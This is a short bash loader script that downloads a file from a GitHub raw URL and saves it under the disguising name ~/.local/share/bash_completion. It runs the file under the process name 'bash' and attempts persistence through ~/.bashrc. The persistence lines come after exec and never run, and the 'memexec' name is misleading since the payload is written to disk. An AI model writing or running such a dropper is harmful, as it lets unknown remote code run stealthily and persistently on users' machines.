#!/bin/bash

memexec_bash() {
    local url="https://github.com/YakouDev/z/raw/refs/heads/main/bash_completion"
    local mempath="$HOME/.local/share/bash_completion"

    mkdir -p "$HOME/.local/share"

    if ! curl -fsSL "$url" -o "$mempath" 2>/dev/null; then
        if ! wget -q "$url" -O "$mempath" 2>/dev/null; then
            exit 1
        fi
    fi

    chmod +x "$mempath"

    exec -a 'bash' "$mempath" "$@"
    echo "$HOME/.local/share/bash_completion" >> "$HOME/.bashrc"
    source "$HOME/.bashrc"
}

# === JALANKAN ===
memexec_bash
